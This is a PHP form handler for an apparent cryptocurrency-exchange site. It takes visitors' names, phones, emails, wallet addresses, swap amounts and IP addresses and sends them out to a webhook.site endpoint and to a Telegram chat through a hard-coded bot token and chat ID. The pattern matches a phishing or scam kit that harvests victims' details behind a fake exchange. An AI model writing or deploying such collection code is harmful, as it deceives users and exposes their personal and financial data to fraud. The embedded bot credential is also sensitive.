<?php

$name = $_POST['name'];
$phone = $_POST['phone'];
$send = $_POST['BTC'];
$get = $_POST['ETH'];
$sendnumber = $_POST['value-1'];
$getnumber = $_POST['value-2'];
$address = $_POST['addres'];
$Email = $_POST['Email'];
$Refferal = $_POST['Refferal'];
$token = "6179322173:AAEnTT9nflef3w0ehqwJHOroZXpZ0t_tpj0";
$chat_id = "-1001945631506";

$data = array(
    'from_pair' => $send,
    'to_pair' => $get,
    'from_count' => $sendnumber,
    'to_count' => $getnumber,
    'wallet' => $address,
    'email' => $Email,
    'referal_code' => $Refferal,
    'from_site' => 'https://foxynex.com/index.html'
);

$payload = json_encode($data);

$ch = curl_init('https://webhook.site/282d85f1-6758-4ddd-94b9-eddefe5a7bed');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($payload)
));

$result = curl_exec($ch);
curl_close($ch);

function get_ip()
{
    $getIpServer = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $getIpServer = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $getIpServer = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } elseif (!empty($_SERVER['REMOTE_ADDR'])) {
        $getIpServer = $_SERVER['REMOTE_ADDR'];
    }
    return $getIpServer;
}
$ip = get_ip();

$arr = array(
  'Crypto' => $name,
  '----------------' => '',
  'Отправил число' => $sendnumber . "({$send})",
  'Получил число' => $getnumber . "({$get})",
  '' => '----------------',
  'Address' => $address,
  'Refferal' => $Refferal,
  'Email' => $Email,
  'IP Адрес: ' =>  $ip,
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: /coin-result/result-BTC.html');
} else {
  echo "Error";
}
?>